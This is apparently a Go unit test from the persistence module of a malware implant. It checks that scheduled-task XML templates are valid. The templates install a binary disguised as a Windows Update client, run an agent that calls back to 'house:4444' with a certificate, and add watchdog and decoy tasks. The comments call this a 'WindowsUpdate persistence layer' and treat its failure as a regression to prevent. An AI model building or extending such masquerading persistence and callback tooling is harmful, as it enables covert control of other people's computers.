package persist

import (
	"strings"
	"testing"
)

// Every template must be well-formed with a Principal, an Exec command and
// triggers. v1.45.2 shipped agent_task.xml missing </Principal>: schtasks
// rejected it with "wfc: element type match" and silently broke the whole
// WindowsUpdate persistence layer. This test exists so that can never recur.
func TestTaskXMLWellFormed(t *testing.T) {
	ap := `C:\ProgramData\Microsoft\Windows\Update\MicrosoftWindowsClient.exe`
	docs := map[string]string{
		"agent_task.xml":        AgentTaskXML(ap, "house:4444", "server.crt"),
		"watchdog_task.xml":     WatchdogTaskXML(ap),
		"orchestrator_task.xml": OrchestratorTaskXML(ap),
		"decoy_task.xml":        DecoyTaskXML(ap),
	}
	for name, doc := range docs {
		if err := ValidateTaskXML(doc); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if !strings.Contains(doc, "MicrosoftWindowsClient.exe") {
			t.Fatalf("%s: binary path missing", name)
		}
	}
}

// The exact v1.45.2 regression, pinned: a Principal closed straight into
// </Principals> must fail validation.
func TestTaskXMLMissingPrincipalClose(t *testing.T) {
	bad := `<?xml version="1.0" encoding="UTF-8"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger/></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType></Principals><Actions Context="Author"><Exec><Command>x</Command></Exec></Actions></Task>`
	if err := ValidateTaskXML(bad); err == nil {
		t.Fatal("missing </Principal> accepted (the v1.45.2 regression)")
	}
}
